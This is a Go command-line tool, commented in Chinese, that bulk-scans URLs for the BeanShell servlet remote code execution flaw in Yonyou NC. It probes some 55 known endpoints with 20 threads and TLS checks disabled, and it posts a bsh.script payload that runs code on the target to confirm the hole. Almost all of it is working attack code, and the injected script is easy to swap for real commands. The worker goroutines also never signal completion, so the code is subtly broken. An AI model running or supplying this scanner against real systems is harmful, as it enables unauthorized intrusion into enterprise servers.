package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/gookit/color"
)

var THREAD int = 20

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	// 生成随机字符串
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func beanshell_rce_test(test_url string) {
	// 测试nc beanshell漏洞
	random_str := RandStringRunes(16)
	post_data := "bsh.script=print(\"" + random_str + "\");\r\n"
	// fmt.Println(post_data)
	resp, _ := http.Post(test_url, "application/x-www-form-urlencoded", strings.NewReader(post_data))
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	resp_content := string(body)
	// fmt.Println(resp_content)
	if strings.Contains(resp_content, "BeanShell") && strings.Contains(resp_content, random_str) {
		str := color.Green.Sprint("[+] " + test_url + " 存在beanshell rce漏洞！")
		color.Println(str)
	} else {
		str := color.Red.Sprint("[-] " + test_url + " 访问成功，但利用失败！")
		color.Println(str)
	}
}

func beanshell_endpoint_test(urlChan <-chan string, wg *sync.WaitGroup) {
	for Url := range urlChan {
		// 设置了时间超时以及禁止重定向
		client := resty.New().SetTimeout(5 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}).SetRedirectPolicy(
			resty.RedirectPolicyFunc(func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			}),
		)
		resp, err := client.R().
			SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71").
			Get(Url)
		if err != nil {
			continue
		}
		//获取响应包的状态码
		respCode := resp.StatusCode()
		if respCode == 200 {
			// fmt.Println("[+] url:" + Url + " 可访问")
			beanshell_rce_test(Url)
			break
		}
	}
}

func test_yongyou_vuln(url_list []string) {
	keys := []string{"/service/~aim/bsh.servlet.BshServlet",
		"/service/~alm/bsh.servlet.BshServlet",
		"/service/~ampub/bsh.servlet.BshServlet",
		"/service/~arap/bsh.servlet.BshServlet",
		"/service/~aum/bsh.servlet.BshServlet",
		"/service/~cc/bsh.servlet.BshServlet",
		"/service/~cdm/bsh.servlet.BshServlet",
		"/service/~cmp/bsh.servlet.BshServlet",
		"/service/~ct/bsh.servlet.BshServlet",
		"/service/~dm/bsh.servlet.BshServlet",
		"/service/~erm/bsh.servlet.BshServlet",
		"/service/~fa/bsh.servlet.BshServlet",
		"/service/~fac/bsh.servlet.BshServlet",
		"/service/~fbm/bsh.servlet.BshServlet",
		"/service/~ff/bsh.servlet.BshServlet",
		"/service/~fip/bsh.servlet.BshServlet",
		"/service/~fipub/bsh.servlet.BshServlet",
		"/service/~fp/bsh.servlet.BshServlet",
		"/service/~fts/bsh.servlet.BshServlet",
		"/service/~fvm/bsh.servlet.BshServlet",
		"/service/~gl/bsh.servlet.BshServlet",
		"/service/~hrhi/bsh.servlet.BshServlet",
		"/service/~hrjf/bsh.servlet.BshServlet",
		"/service/~hrpd/bsh.servlet.BshServlet",
		"/service/~hrpub/bsh.servlet.BshServlet",
		"/service/~hrtrn/bsh.servlet.BshServlet",
		"/service/~hrwa/bsh.servlet.BshServlet",
		"/service/~ia/bsh.servlet.BshServlet",
		"/service/~ic/bsh.servlet.BshServlet",
		"/service/~iufo/bsh.servlet.BshServlet",
		"/service/~modules/bsh.servlet.BshServlet",
		"/service/~mpp/bsh.servlet.BshServlet",
		"/service/~obm/bsh.servlet.BshServlet",
		"/service/~pu/bsh.servlet.BshServlet",
		"/service/~qc/bsh.servlet.BshServlet",
		"/service/~sc/bsh.servlet.BshServlet",
		"/service/~scmpub/bsh.servlet.BshServlet",
		"/service/~so/bsh.servlet.BshServlet",
		"/service/~so2/bsh.servlet.BshServlet",
		"/service/~so3/bsh.servlet.BshServlet",
		"/service/~so4/bsh.servlet.BshServlet",
		"/service/~so5/bsh.servlet.BshServlet",
		"/service/~so6/bsh.servlet.BshServlet",
		"/service/~tam/bsh.servlet.BshServlet",
		"/service/~tbb/bsh.servlet.BshServlet",
		"/service/~to/bsh.servlet.BshServlet",
		"/service/~uap/bsh.servlet.BshServlet",
		"/service/~uapbd/bsh.servlet.BshServlet",
		"/service/~uapde/bsh.servlet.BshServlet",
		"/service/~uapeai/bsh.servlet.BshServlet",
		"/service/~uapother/bsh.servlet.BshServlet",
		"/service/~uapqe/bsh.servlet.BshServlet",
		"/service/~uapweb/bsh.servlet.BshServlet",
		"/service/~uapws/bsh.servlet.BshServlet",
		"/service/~vrm/bsh.servlet.BshServlet",
	}
	var url_l []string
	// 组合url和endpoint为数组
	for _, key := range keys {
		for _, Url := range url_list {
			if key != "" {
				Url := Url + key
				url_l = append(url_l, Url)
			}
		}
	}

	// 设置管道
	urlChan := make(chan string, len(url_l))
	// 生产者
	for _, single_url := range url_l {
		urlChan <- single_url
	}
	close(urlChan)

	var wg sync.WaitGroup
	wg.Add(THREAD)
	//消费者
	for i := 0; i < THREAD; i++ {
		go beanshell_endpoint_test(urlChan, &wg)
	}
	wg.Wait()
}

func ReadFile(filePath string) {
	f, err := os.Open(filePath)
	if err != nil {
		panic(err)
	}
	defer f.Close()

	reader := bufio.NewReader(f)
	var url_list []string
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				fmt.Printf("%#v\n", line)
				break
			}
			panic(err)
		} else {
			line = strings.Replace(line, " ", "", -1)
			line = strings.Replace(line, "\n", "", -1)
		}
		if line != "" {
			url_list = append(url_list, line)
		}
	}
	test_yongyou_vuln(url_list)
}

func main() {
	var File_path string
	var Url string
	flag.StringVar(&Url, "u", "", "the input URL")
	flag.StringVar(&File_path, "l", "", "the input files")

	flag.Parse()

	// 判断传入数据类型，不管是哪种都生成一个数组传入扫描函数
	if Url == "" && File_path == "" {
		fmt.Println("请指定url或者file")
	} else if Url != "" {
		url_list := []string{Url}
		test_yongyou_vuln(url_list)
	} else if File_path != "" {
		_, err := os.Stat(File_path)
		if err != nil {
			panic(err)
		} else {
			fmt.Println("文件读取成功：", File_path)
			ReadFile(File_path)
		}
	}
}
